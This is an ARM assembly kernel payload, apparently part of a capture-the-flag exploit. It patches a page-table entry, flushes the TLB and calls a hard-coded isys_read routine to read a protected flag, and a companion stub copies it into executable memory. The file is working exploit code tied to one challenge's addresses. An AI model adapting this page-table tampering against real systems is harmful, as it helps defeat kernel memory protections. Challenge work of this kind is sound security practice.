// Main Kernel Payload
// Will be stored in the kernel heap
// then copied to executable location
// by kstub.asm
.globl _start
_start:
    // Fix flag page table
    ldr r0, =0x2a00000
    mov r3, #0x400
    add r3, #0x13
    movt r3, #0x400
    str r3, [r0, #0x100]

    // Invalidate the TLB
    mov r3, #0
	mcr p15, 0, r3, c8, c7, 0

	// Now read the flag
    mov r1, #0x4000000    	// read the second stage here
    mov r2, #0x20
    mov r4, #0x10000    	// address of isys_read
    add r4, #0x800
    add r4, #0x64
    blx r4
hang:
    b hang

// Some addresses needed by kstub.asm
addresses:
    .word 0x80000 // adress where to copy _this_ binary
    .word 0x11a4c // address of memcpy
    .word 0x200   // size of memcpy    
